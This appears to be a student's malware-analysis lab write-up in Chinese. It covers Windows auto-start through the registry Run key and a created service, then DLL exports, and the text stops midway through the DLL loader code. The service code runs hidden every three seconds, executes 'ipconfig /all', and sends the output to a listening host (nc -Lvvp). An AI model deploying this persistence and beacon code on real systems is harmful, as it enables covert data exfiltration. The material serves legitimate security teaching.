<!DOCTYPE html>
<html lang="en">
    <head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0,  viewport-fit=cover" name="viewport" />
    <meta name="description" content="Malware Analysis Practice2" />
    <meta name="hexo-theme-A4" content="v1.7.0" />
    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
    <title>Jay1an | </title>

    
        
            
<link rel="stylesheet" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/reset.css">

            
<link rel="stylesheet" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/markdown.css">

            
<link rel="stylesheet" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/fonts.css">
 
            <!--注意：首页既不是post也不是page-->
            
        
    
    
<link rel="stylesheet" href="/css/ui.css">
 
    
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 6.3.0"></head>
    
    <body>
        <div class="paper">
            
            
            
            
                <div class="shadow-drop-2-bottom paper-main">
                    
<div class="header">
    <div class="header-container">
        <img style="
        width: 56px;
        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
        <div class="header-content">
            <a class="logo" href="/">Jay1an</a> 
            <span class="description">I am who I am.</span> 
        </div>
        
    </div>
    
   
    <ul class="nav">
        
            
                <li><a href="/">首页</a></li>
            
        
            
                <li><a href="/list/">文章</a></li>
            
        
            
                <li><a href="/tags/">标签</a></li>
            
        
            
                <li><a href="/categories/">分类</a></li>
            
        
    </ul>
</div> 
        
                    
                    

                    
                    
                    
                    <!--说明是文章post页面-->
                    
                        <div class="post-main">

    
        <div class="post-main-title">
            Malware Analysis Practice2
        </div>
      
    

    <div class="post-md">
        
            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B7%BB%E5%8A%A0%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%90%AF%E5%8A%A8"><span class="post-toc-text">通过修改注册表添加服务的方式实现自启动</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82"><span class="post-toc-text">实验要求</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="post-toc-text">实验环境</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84"><span class="post-toc-text">实验目的</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4"><span class="post-toc-text">实验步骤</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E5%AE%9E%E8%B7%B5-1-%E4%BF%AE%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8"><span class="post-toc-text">实践-1-修改注册表自启动</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#Run-RunOnce-RunOnceEx%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="post-toc-text">Run&#x2F;RunOnce&#x2F;RunOnceEx的区别</span></a></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#%E5%AE%9E%E8%B7%B5-2-%E6%B7%BB%E5%8A%A0%E6%9C%8D%E5%8A%A1%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%90%AF%E5%8A%A8"><span class="post-toc-text">实践-2-添加服务实现自启动</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="post-toc-text">参考资料</span></a></li></ol></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#DLL%E6%96%87%E4%BB%B6%E7%BC%96%E5%86%99"><span class="post-toc-text">DLL文件编写</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-1"><span class="post-toc-text">实验要求</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83-1"><span class="post-toc-text">实验环境</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84-1"><span class="post-toc-text">实验目的</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4-1"><span class="post-toc-text">实验步骤</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#%E7%94%9F%E6%88%90DLL%E6%96%87%E4%BB%B6"><span class="post-toc-text">生成DLL文件</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#%E8%B0%83%E7%94%A8DLL%E6%96%87%E4%BB%B6"><span class="post-toc-text">调用DLL文件</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="post-toc-text">测试</span></a></li></ol></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E7%AE%80%E5%8D%95%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="post-toc-text">简单多线程服务器</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-2"><span class="post-toc-text">实验要求</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83-2"><span class="post-toc-text">实验环境</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84-2"><span class="post-toc-text">实验目的</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4-2"><span class="post-toc-text">实验步骤</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%9A%84%E4%BB%A3%E7%A0%81task3-server-cpp"><span class="post-toc-text">服务端的代码task3_server.cpp</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E4%BB%A3%E7%A0%81task3-client-cpp"><span class="post-toc-text">客户端的代码task3_client.cpp</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#%E6%B5%8B%E8%AF%95-1"><span class="post-toc-text">测试</span></a></li></ol></li></ol></li></ol></li></ol>
        
        <h2 id="通过修改注册表添加服务的方式实现自启动"><a href="#通过修改注册表添加服务的方式实现自启动" class="headerlink" title="通过修改注册表添加服务的方式实现自启动"></a>通过修改注册表添加服务的方式实现自启动</h2><h3 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h3><ul>
<li>编写代码，编辑注册表的Run&#x2F;RunOnce&#x2F;RunOnceEx键（任选其一，并明确三个键的区别），达到让某一程序在系统启动后自动运行的目的（可以以计算器、记事本等作为目标程序）。</li>
<li>以服务方式实现自启动，以DLL或者EXE方式均可。</li>
</ul>
<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ul>
<li>Windows 7或Windows 10主机（虚拟机）；</li>
<li>代码编辑器；</li>
<li>C&#x2F;C++代码运行所需环境。</li>
</ul>
<h3 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h3><p>了解恶意代码自启动常用手段。</p>
<h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h4 id="实践-1-修改注册表自启动"><a href="#实践-1-修改注册表自启动" class="headerlink" title="实践-1-修改注册表自启动"></a>实践-1-修改注册表自启动</h4><p>利用C语言编程，编辑<code>HKEY_CURRENT_USER</code>下的自启动健<code>Run</code>，实现开机自启动谷歌浏览器。</p>
<p>用到了<code>Windows.h</code>库的<code>regOpenResultEx</code>函数和<code>regSetValueEx</code>等函数。</p>
<pre><code class="c">#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;

int main() &#123;
    HKEY hKey;
    LONG regOpenResult;

    // 打开注册表键
    // 注：HKEY_CURRENT_USER表示只针对当前用户，若要改为HKEY_LOCAL_MACHINE则需要管理员权限
    regOpenResult = RegOpenKeyEx(HKEY_CURRENT_USER, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, 0, KEY_ALL_ACCESS, &amp;hKey);
    if (regOpenResult != ERROR_SUCCESS) &#123;
        printf(&quot;无法打开注册表键: %d\n&quot;, regOpenResult);
        return 1;
    &#125;

    // 设置键值的名字对应的值
    const char* name = &quot;auto_run_chrome&quot;; 
    const char* value = &quot;C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe&quot;;   // 设置要自启动的程序的路径

    //将其写入run下
    regOpenResult = RegSetValueEx(hKey,name,0,REG_SZ,value,strlen(value)+1); 
    if(regOpenResult != ERROR_SUCCESS)&#123;
        printf(&quot;自启动项写入失败:%d\n&quot;,regOpenResult);
        return 1;
    &#125;else&#123;
        printf(&quot;自启动项写入成功!\n&quot;);
    &#125;

    // 关闭注册表键
    RegCloseKey(hKey);

    return 0;
&#125;
</code></pre>
<pre><code class="c#">PS C:\Users\jay1an\Desktop\2023-10-30&gt; gcc .\task1.c
PS C:\Users\jay1an\Desktop\2023-10-30&gt; .\a.exe
自启动项写入成功!
</code></pre>
<p>然后再查看注册表，会发现谷歌浏览器已经被添加到run下了。</p>
<p><img src="/../img/Malware-Analysis-practice2/1.png" alt="1"></p>
<p>切换用户时（重启动也算），电脑会自动打开谷歌浏览器。</p>
<h5 id="Run-RunOnce-RunOnceEx的区别"><a href="#Run-RunOnce-RunOnceEx的区别" class="headerlink" title="Run&#x2F;RunOnce&#x2F;RunOnceEx的区别"></a><code>Run</code>&#x2F;<code>RunOnce</code>&#x2F;<code>RunOnceEx</code>的区别</h5><p>只考虑在 <code>HKEY_CURRENT_USER</code> 下的情况，<code>HKEY_CURRENT_USER</code> 中的项目只适用于当前登录的用户。</p>
<p>下面是有关 <code>Run</code>、<code>RunOnce</code> 和 <code>RunOnceEx</code> 键的主要区别：</p>
<ol>
<li><strong><code>Run</code>键</strong> (<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>)：<ul>
<li><strong>执行时机</strong>：这个键中的项目在当前用户每次登录后都会自动运行，包括系统启动和用户切换。</li>
</ul>
</li>
<li><strong><code>RunOnce</code>键</strong> (<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>)：<ul>
<li><strong>执行时机</strong>：这个键中的项目只在当前用户的下一次登录后运行一次，然后自动从注册表中删除。</li>
</ul>
</li>
<li><strong><code>RunOnceEx</code>键</strong> (<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code>)：<ul>
<li><strong>执行时机</strong>：这个键中的项目类似于<code>RunOnce</code>键，只在当前用户的下一次登录后运行一次，然后自动从注册表中删除。</li>
<li><strong>额外特性</strong>：<code>RunOnceEx</code>键允许更复杂的操作，如在项目中指定一个批处理文件或脚本，以便在登录时执行多个命令。</li>
</ul>
</li>
</ol>
<p>在单个用户的情况下，可以使用 <code>Run</code> 键来配置在每次该用户登录时自动运行的程序，而 <code>RunOnce</code> 键用于配置只在该用户的下一次登录时运行一次的程序。<code>RunOnceEx</code> 提供了更高级的选项，可以用于执行复杂的任务。</p>
<h4 id="实践-2-添加服务实现自启动"><a href="#实践-2-添加服务实现自启动" class="headerlink" title="实践-2-添加服务实现自启动"></a>实践-2-添加服务实现自启动</h4><p>创建服务的代码：</p>
<pre><code class="c++">#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;

int main() &#123;
    SC_HANDLE schSCManager, schService;
    // 填写系统服务exe文件
    TCHAR szPath[MAX_PATH] = &quot;C:\\Users\\jay1an\\Desktop\\practice2\\2023-11-13-service\\myservice.exe&quot;;
    
    // 打开服务控制管理器
    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (schSCManager == NULL) &#123;
        DWORD error = GetLastError();
        if (error == ERROR_ACCESS_DENIED) &#123;
            printf(&quot;Access denied. Run the program as administrator.\n&quot;);
        &#125; else &#123;
            printf(&quot;OpenSCManager failed (%d)\n&quot;, error);
        &#125;
        return 1;
    &#125;

    // 创建服务并设置其启动参数
    schService = CreateService(
        schSCManager,               // SCManager database
        TEXT(&quot;myservice&quot;),          // name of service
        TEXT(&quot;malicious code lab&quot;), // name to display
        SERVICE_ALL_ACCESS,         // desired access
        SERVICE_WIN32_OWN_PROCESS,  // service type
        SERVICE_AUTO_START,         // start type
        SERVICE_ERROR_NORMAL,       // error control type
        szPath,                     // path to service&#39;s binary
        NULL,                       // no load ordering group
        NULL,                       // no tag identifier
        NULL,                       // no dependencies
        NULL,                       // LocalSystem account
        NULL                        // no password
    );

    if (schService == NULL) &#123;
        fprintf(stderr, &quot;CreateService failed (%d)\n&quot;, GetLastError());
        CloseServiceHandle(schSCManager);
        return 1;
    &#125; else &#123;
        printf(&quot;Service installed successfully.\n&quot;);
    &#125;

    // 启动服务
    // 这里需要管理员权限
    if (!StartService(schService, 0, NULL)) &#123;
        fprintf(stderr, &quot;StartService failed (%d)\n&quot;, GetLastError());
    &#125;else&#123;
        printf(&quot;Service starts successfully.\n&quot;);
    &#125;

    // 关闭句柄
    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);

    return 0;
&#125;
</code></pre>
<p>使用管理员权限运行创建-启动服务的程序：</p>
<p><img src="/../img/Malware-Analysis-Practice2/10.png" alt="10"></p>
<p>可以在windows注册表(<code>regedit</code>)中查看，也可以在服务控制台(<code>services.msc</code>)中查看。</p>
<p><img src="/../img/Malware-Analysis-practice2/11.png" alt="11"></p>
<blockquote>
<p>服务注册表位于注册表路径 <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\YourServiceName</code> 下，其中 <code>YourServiceName</code> 是你的服务的名称。</p>
</blockquote>
<p>在 Windows 操作系统中，服务注册表中的 <code>ImagePath</code> 是服务二进制文件的路径。该注册表项指定了服务的可执行文件位置。当服务被启动时，系统将加载该二进制文件，并执行其中的服务代码。</p>
<p><code>Start</code>的值为2，表示该服务在系统启动时自动启动。</p>
<p><strong>但是自启动服务程序并不是普通的程序，而是要求程序创建服务入口点函数，否则，不能启动系统服务。</strong></p>
<p>myservice.cpp代码：</p>
<pre><code class="c++">#include &lt;winsock2.h&gt;
#include &lt;windows.h&gt;
#include &lt;ws2tcpip.h&gt;
#include &lt;cstdio&gt;

#pragma comment(lib, &quot;ws2_32.lib&quot;)

#define DEFAULT_BUFLEN 1024
using namespace std;

SERVICE_STATUS        g_ServiceStatus = &#123;0&#125;;
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE                g_ServiceStopEvent = INVALID_HANDLE_VALUE;

// 自定义函数
// 实现通过tcp连接向192.168.65.1的12345端口发送&#39;ipconfig /all&#39;的执行结果
void cmd(const char *host,int port)&#123;
    
    SOCKET ShellSock;
    sockaddr_in C2addr;

    WSADATA Sockver = &#123; 0 &#125;;
    WSAStartup(MAKEWORD(2, 2), &amp;Sockver);

    // 创建套接字
    ShellSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    // 设置服务器地址
    C2addr.sin_family = AF_INET;
    C2addr.sin_addr.S_un.S_addr = inet_addr(host);
    C2addr.sin_port = htons(port);

    if (WSAConnect(ShellSock, (SOCKADDR*)&amp;C2addr, sizeof(C2addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) &#123;
            closesocket(ShellSock);
            WSACleanup();
            return;
    &#125;else&#123;
        HANDLE hReadPipe = NULL;
        HANDLE hWritePipe = NULL;
        SECURITY_ATTRIBUTES securityAttributes = &#123; 0 &#125;;
        BOOL bRet = FALSE;
        STARTUPINFO si = &#123; 0 &#125;;
        char command[DEFAULT_BUFLEN];
        PROCESS_INFORMATION pi = &#123; 0 &#125;;
        char pszResultBuffer[DEFAULT_BUFLEN];

        securityAttributes.bInheritHandle = TRUE;
        securityAttributes.nLength = sizeof(securityAttributes);
        securityAttributes.lpSecurityDescriptor = NULL;

        bRet = CreatePipe(&amp;hReadPipe, &amp;hWritePipe, &amp;securityAttributes, 0);
        if (!bRet || hReadPipe == INVALID_HANDLE_VALUE) &#123;
            closesocket(ShellSock);
            WSACleanup();  
        &#125;

        si.cb = sizeof(si);
        si.hStdError = hWritePipe;
        si.hStdOutput = hWritePipe;
        si.wShowWindow = SW_HIDE;
        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

        // 构造命令
        strcpy(command, &quot;cmd.exe /c &quot;);
        strcat(command, &quot;ipconfig /all&quot;);

        bRet = CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;pi);
        
        WaitForSingleObject(pi.hThread, INFINITE);
        WaitForSingleObject(pi.hProcess, INFINITE);
        memset(pszResultBuffer, 0, sizeof(pszResultBuffer));
        // 读取子进程的输出
        DWORD bytesRead;
        if (!ReadFile(hReadPipe, pszResultBuffer, DEFAULT_BUFLEN, &amp;bytesRead, NULL)) &#123;
            closesocket(ShellSock);
            WSACleanup();   
        &#125;

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        CloseHandle(hWritePipe);
        CloseHandle(hReadPipe);
        // 发送输出到套接字
        send(ShellSock, pszResultBuffer, DEFAULT_BUFLEN, 0);
        // 关闭套接字
        closesocket(ShellSock);
        WSACleanup();  
    &#125;
&#125;

// 该服务实现了，每三秒向远方主机发送&#39;ipconfig /all&#39;的执行结果
void StartServiceWork() &#123;
    while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0) &#123;
        // 这里放置你的服务工作逻辑
        const char* host = &quot;192.168.65.1&quot;;
        int port = 12345;
        cmd(host,port);
        Sleep(3000);
    &#125;
&#125;

VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode) &#123;
    if (CtrlCode == SERVICE_CONTROL_STOP) &#123;
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(g_StatusHandle, &amp;g_ServiceStatus);

        SetEvent(g_ServiceStopEvent);
    &#125;
&#125;

VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv) &#123;
    g_StatusHandle = RegisterServiceCtrlHandler(&quot;myservice&quot;, ServiceCtrlHandler);

    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    SetServiceStatus(g_StatusHandle, &amp;g_ServiceStatus);

    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_StatusHandle, &amp;g_ServiceStatus);

    StartServiceWork();

    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_StatusHandle, &amp;g_ServiceStatus);
&#125;

int main(int argc, char* argv[]) &#123;
    char name []= &quot;myservice&quot;;
    SERVICE_TABLE_ENTRY ServiceTable[] = &#123;
        &#123; name, (LPSERVICE_MAIN_FUNCTION)ServiceMain&#125;,
        &#123;NULL, NULL&#125;
    &#125;;

    StartServiceCtrlDispatcher(ServiceTable);

    return 0;
&#125;
</code></pre>
<p>192.168.65.1主机是用nc对12345端口进行监听:</p>
<pre><code class="shell">nc -Lvvp 12345
</code></pre>
<p><img src="/../img/Malware-Analysis-practice2/12.png" alt="12"></p>
<p>运行了服务的虚拟机：</p>
<p><img src="/../img/Malware-Analysis-practice2/13.png" alt="13"></p>
<blockquote>
<p>注：</p>
<pre><code class="shell">[System Process]	0	TCP	win-0r0scl2qm11.localdomain	49396	laptop-j2g20010	12345	TIME_WAIT
</code></pre>
<ul>
<li><strong>[System Process]</strong>: 这可能是指示此TCP连接所属的进程名称。在这里是“System Process”，表示这个连接由系统进程处理。</li>
<li><strong>0</strong>: 这可能是与TCP连接相关的进程ID（PID），但在这个文本中显示为0。这可能是因为系统进程通常不与特定的用户级进程关联。</li>
<li><strong>TCP</strong>: 表示这是一个TCP连接。</li>
<li><strong>win-0r0scl2qm11.localdomain</strong>: 是本地主机的名称或标识。</li>
<li><strong>49396</strong>: 是本地主机的端口号。</li>
<li><strong>laptop-j2g20010</strong>: 是远程主机的名称或标识。</li>
<li><strong>12345</strong>: 是远程主机的端口号。</li>
<li><strong>TIME_WAIT</strong>: 是连接状态，表示连接已经关闭，但在等待一段时间后将被系统释放。</li>
</ul>
</blockquote>
<h5 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h5><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/TJTO/p/13216616.html">https://www.cnblogs.com/TJTO/p/13216616.html</a></p>
<h2 id="DLL文件编写"><a href="#DLL文件编写" class="headerlink" title="DLL文件编写"></a>DLL文件编写</h2><h3 id="实验要求-1"><a href="#实验要求-1" class="headerlink" title="实验要求"></a>实验要求</h3><p>编写一个DLL，使得在动态加载该DLL时，能够弹出“目标DLL已加载”的对话框。同时，为DLL添加两个导出函数，分别实现读取文件并打印出来，以及写入文件的功能，并且能够被其他程序动态调用。</p>
<h3 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h3><ul>
<li><p>Windows 7或Windows 10主机（虚拟机）；</p>
</li>
<li><p>代码编辑器；</p>
</li>
<li><p>C&#x2F;C++代码运行所需环境。</p>
</li>
</ul>
<h3 id="实验目的-1"><a href="#实验目的-1" class="headerlink" title="实验目的"></a>实验目的</h3><p>了解DLL的作用和调用其函数的方法。</p>
<h3 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h3><h5 id="生成DLL文件"><a href="#生成DLL文件" class="headerlink" title="生成DLL文件"></a>生成<code>DLL</code>文件</h5><p>编写task2.cpp，这段代码是一个 DLL（动态链接库）的主入口函数 <code>DllMain</code>，以及三个导出函数 <code>function_1</code>、<code>ReadAndPrintFile</code>、<code>WriteToFile</code>。</p>
<ul>
<li><code>DllMain</code> 是 DLL 的主入口函数，它在不同的情况下被调用，根据 <code>ul_reason_for_call</code> 参数的不同值，可以执行不同的操作。</li>
</ul>
<p>task2.cpp中的<code>DLLMain</code>函数在每一次被调用后都会通过<code>MessageBoxW</code>函数提示当前的<code>ul_reason_for_cal</code>。</p>
<blockquote>
<p>参数意义:</p>
<p>①<code>hModule</code>参数：指向DLL本身的实例句柄； </p>
<p>②<code>ul_reason_for_call</code>参数：指明了DLL被调用的原因，可以有以下4个取值：</p>
<ol>
<li><strong>DLL_PROCESS_ATTACH：进程映射</strong></li>
</ol>
<p>当DLL被进程 &lt;&lt;第一次&gt;&gt; 调用时，导致<code>DllMain</code>函数被调用，同时<code>ul_reason_for_call</code>的值为<code>DLL_PROCESS_ATTACH</code>，如果同一个进程后来再次调用此DLL时，操作系统只会增加DLL的使用次数，不会再用<code>DLL_PROCESS_ATTACH</code>调用DLL的<code>DllMain</code>函数。</p>
<ol start="2">
<li><strong>DLL_PROCESS_DETACH：进程卸载</strong></li>
</ol>
<p>当DLL被从进程的地址空间解除映射时，系统调用了它的<code>DllMain</code>，传递的<code>ul_reason_for_call</code>值是<code>DLL_PROCESS_DETACH</code>。</p>
<p>★如果进程的终结是因为调用了<code>TerminateProcess</code>，系统就不会用<code>DLL_PROCESS_DETACH</code>来调用DLL的<code>DllMain</code>函数。这就意味着DLL在进程结束前没有机会执行任何清理工作。</p>
<ol start="3">
<li><strong>DLL_THREAD_ATTACH：线程映射</strong></li>
</ol>
<p>当进程创建一线程时，系统查看当前映射到进程地址空间中的所有DLL文件映像，并用值<code>DLL_THREAD_ATTACH</code>调用DLL的<code>DllMain</code>函数。新创建的线程负责执行这次的DLL的<code>DllMain</code>函数，只有当所有的DLL都处理完这一通知后，系统才允许线程开始执行它的线程函数。</p>
<ol start="4">
<li><strong>DLL_THREAD_DETACH：线程卸载</strong></li>
</ol>
<p>如果线程调用了<code>ExitThread</code>来结束线程（线程函数返回时，系统也会自动调用<code>ExitThread</code>），系统查看当前映射到进程空间中的所有DLL文件映像，并用<code>DLL_THREAD_DETACH</code>来调用<code>DllMain</code>函数，通知所有的DLL去执行线程级的清理工作。</p>
<p>★注意：如果线程的结束是因为系统中的一个线程调用了<code>TerminateThread</code>，系统就不会用值<code>DLL_THREAD_DETACH</code>来调用所有DLL的<code>DllMain</code>函数。</p>
<p>③<code>lpReserved</code>参数：保留，目前没什么意义。</p>
</blockquote>
<ul>
<li><code>function_1</code>：一个简单的弹窗显示消息的函数，通过 <code>MessageBoxW</code> 函数显示一个包含 “Hello, this is function_1” 的消息框。</li>
<li><code>ReadAndPrintFile</code>：读取文件并打印内容到标准输出。它接收一个文件名作为参数，尝试以二进制方式打开文件，如果文件打开成功，将文件内容输出到标准输出流（<code>std::cout</code>）。</li>
<li><code>WriteToFile</code>：写入内容到文件中。它接收一个文件名、要写入的内容和文件打开模式作为参数。打开文件时使用了传入的模式，将内容写入文件后关闭文件。</li>
</ul>
<pre><code class="c++">#include &lt;Windows.h&gt;
#include &lt;iostream&gt;
#include &lt;fstream&gt;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
&#123;
    switch (ul_reason_for_call)
    &#123;
    case DLL_PROCESS_ATTACH:
        // DLL 被进程加载时调用
        // 在这里进行初始化工作
        MessageBoxW(NULL, L&quot;DLL_PROCESS_ATTACH&quot;, L&quot;DLL_PROCESS_ATTACH&quot;, MB_ICONINFORMATION | MB_OK);
        break;

    case DLL_THREAD_ATTACH:
        // 线程创建时调用
        MessageBoxW(NULL, L&quot;DLL_THREAD_ATTACH&quot;, L&quot;DLL_THREAD_ATTACH&quot;, MB_ICONINFORMATION | MB_OK);
        break;

    case DLL_THREAD_DETACH:
        // 线程销毁时调用
        MessageBoxW(NULL, L&quot;DLL_THREAD_DETACH&quot;, L&quot;DLL_THREAD_DETACH&quot;, MB_ICONINFORMATION | MB_OK);
        break;

    case DLL_PROCESS_DETACH:
        // DLL 被进程卸载时调用
        // 在这里进行清理工作
        MessageBoxW(NULL, L&quot;DLL_PROCESS_DETACH&quot;, L&quot;DLL_PROCESS_DETACH&quot;, MB_ICONINFORMATION | MB_OK);
        break;
    &#125;

    return TRUE;
&#125;

// 测试函数，调用functioN_1则会弹出提示消息框
extern &quot;C&quot; __declspec(dllexport) void function_1()
&#123;
    MessageBoxW(NULL, L&quot;Hello, this is function_1&quot;, L&quot;Function_1&quot;, MB_ICONINFORMATION | MB_OK);
&#125;

extern &quot;C&quot; __declspec(dllexport) void ReadAndPrintFile(const char* filename) &#123;
    // 读取文件并打印内容
    std::ifstream fileStream(filename, std::ios::binary);
    if (fileStream.is_open()) &#123;
        std::cout &lt;&lt; &quot;Content of &quot; &lt;&lt; filename &lt;&lt; &quot;:\n&quot;;
        std::cout &lt;&lt; fileStream.rdbuf();
        fileStream.close();
    &#125; else &#123;
        std::cerr &lt;&lt; &quot;Error opening file: &quot; &lt;&lt; filename &lt;&lt; &quot;\n&quot;;
    &#125;
&#125;

extern &quot;C&quot; __declspec(dllexport) void WriteToFile(const char* filename, const char* content, std::ios_base::openmode mode) &#123;
    // 写入文件
    std::ofstream fileStream(filename, mode | std::ios::binary);
    if (fileStream.is_open()) &#123;
        fileStream &lt;&lt; content;
        fileStream.close();
        std::cout &lt;&lt; &quot;Content written to &quot; &lt;&lt; filename &lt;&lt; &quot;\n&quot;;
    &#125; else &#123;
        std::cerr &lt;&lt; &quot;Error opening file for writing: &quot; &lt;&lt; filename &lt;&lt; &quot;\n&quot;;
    &#125;
&#125;
</code></pre>
<p>将其导出为<code>DLL</code>文件。</p>
<pre><code class="shell">gcc -shared -o task2.dll task2.cpp
</code></pre>
<h5 id="调用DLL文件"><a href="#调用DLL文件" class="headerlink" title="调用DLL文件"></a>调用<code>DLL</code>文件</h5><p>然后编写a.cpp，使其加载刚刚导出的task2.dll文件，并调用task2.dll里的函数。</p>
<pre><code class="c++">#include &lt;Windows.h&gt;
#include &lt;iostream&gt;

// 声明函数指针类型
typedef void(*Function1Ptr)();
typedef void(*ReadAndPrintFilePtr)(const char*);
typedef void(*WriteToFilePtr)(const char*, const char*, std::ios_base::openmode);

int main(int argc, char* argv[]) &#123;
    if (argc &lt; 2) &#123;
        std::cerr &lt;&lt; &quot;Usage: &quot; &lt;&lt; argv[0] &lt;&lt; &quot; &lt;filename&gt; [content]\n&quot;;
        return 1;
    &#125;

    // 加载 DLL
    HMODULE dllHandle = LoadLibraryA(&quot;task2.dll&quot;);  

    if (dllHandle != NULL) &#123;
        // 获取函数地址
        Function1Ptr function1 = (Function1Ptr)GetProcAddress(dllHandle, &quot;function_1&quot;);
